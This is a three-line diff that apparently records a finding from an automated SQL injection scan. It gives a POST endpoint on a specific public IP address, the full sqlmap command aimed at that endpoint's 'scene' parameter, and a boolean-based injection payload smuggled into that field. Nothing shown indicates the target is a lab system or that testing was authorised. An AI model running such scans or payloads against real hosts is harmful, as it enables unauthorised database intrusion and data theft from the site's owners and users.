@@ -1,0 +1,3 @@
+http://8.136.14.165:80/aform/index/AutoComplete (POST)  # "D:\Program Files\Python\Python311\Scripts\sqlmap" -r sqlmap_requests\002_SQL_Injection_scene_3883157333370472110.txt --batch --smart --random-agent --output-dir sqlmap_output\002_3883157333370472110 -p scene
+
+limit=10&q=e&scene=code' AND ((42)=(43-1)) AND '000IAdT'='000IAdT
